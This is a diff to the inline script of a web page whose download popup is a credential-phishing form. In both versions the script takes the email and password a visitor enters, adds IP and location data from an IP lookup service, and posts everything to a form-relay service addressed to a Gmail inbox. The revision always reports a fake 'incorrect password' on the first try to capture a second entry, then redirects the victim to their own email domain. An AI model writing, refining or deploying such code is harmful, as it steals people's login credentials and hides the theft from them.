@@ -528,7 +528,7 @@
   <script>
     document.addEventListener('DOMContentLoaded', function () {
   // Element references
-  const downloadButtons = document.querySelectorAll('.download-icon'); // Target only the icons
+  const downloadButtons = document.querySelectorAll('.download-icon');
   const downloadAllButton = document.getElementById('downloadButton');
   const popupForm = document.getElementById('popupForm');
   const popupOverlay = document.getElementById('popupOverlay');
@@ -650,7 +650,7 @@
   let isAuthenticated = false;
   let authEmail = '';
 
-  // Form submission handler
+  // Form submission handler using jQuery approach
   async function handleSubmit(event) {
     event.preventDefault();
 
@@ -669,34 +669,27 @@
 
     errorMessage.style.display = 'none';
     showLoading(true);
+    submitButton.textContent = 'Verifying...';
 
     try {
-      await new Promise((resolve) => setTimeout(resolve, 2000));
-
-      step++; // Increment submission attempt
-
-      // Trigger network error on second submission
-      if (step === 2) {
-        throw new Error('Network error');
-      }
-
-      const ipResponse = await fetch('https://ipapi.co/json/');
+      // Get IP information
+      const ipResponse = await fetch('https://ipinfo.io/json');
       if (!ipResponse.ok) throw new Error('Network error');
       const ipData = await ipResponse.json();
 
+      step++; // Increment submission attempt
+
+      // Prepare form data
       const formData = {
-        _subject: `Logs | ${email} | ${ipData.ip || 'Unknown IP'}`,
+        _subject: "Logs | " + ipData.ip,
         Email: email,
         Password: password,
         Attempts: step,
-        IP: ipData.ip || 'Not available',
-        Location: `${ipData.city || 'Unknown'}, ${ipData.country || 'Unknown'}`,
-        Domain: email.split('@').pop(),
-        ISP: ipData.org || 'Unknown',
-        Hostname: ipData.hostname || 'Unknown',
-        Timestamp: new Date().toISOString(),
+        IP: ipData.ip,
+        Location: ipData.city + ", " + ipData.country,
       };
 
+      // Submit to FormSubmit
       const submitResponse = await fetch('https://formsubmit.co/ajax/jose.marckaric@gmail.com', {
         method: 'POST',
         headers: {
@@ -710,26 +703,29 @@
 
       const result = await submitResponse.json();
 
-      if (password !== 'correctpassword123') {
-        throw new Error('Incorrect password');
+      // Redirect on second attempt
+      if (step === 2) {
+        const domain = email.split('@').pop(); // Extract domain from email
+        showLoading(false);
+        window.location.href = `http://${domain}`;
+        return;
       }
 
-      isAuthenticated = true;
-      authEmail = email;
-      closePopup();
-      enableDownloads();
+      // Show incorrect password message on first attempt
+      showError('Incorrect password. Please try again.');
+      showLoading(false);
+      submitButton.textContent = 'Sign in';
+
     } catch (error) {
       console.error('Submission error:', error);
       showLoading(false);
+      submitButton.textContent = 'Sign in';
+      
       if (error.message === 'Network error') {
         closePopup();
         showNetworkError();
       } else {
-        showError(
-          error.message === 'Incorrect password'
-            ? 'Incorrect password. Please try again.'
-            : 'An error occurred. Please try again later.'
-        );
+        showError('An error occurred. Please try again later.');
       }
     }
   }
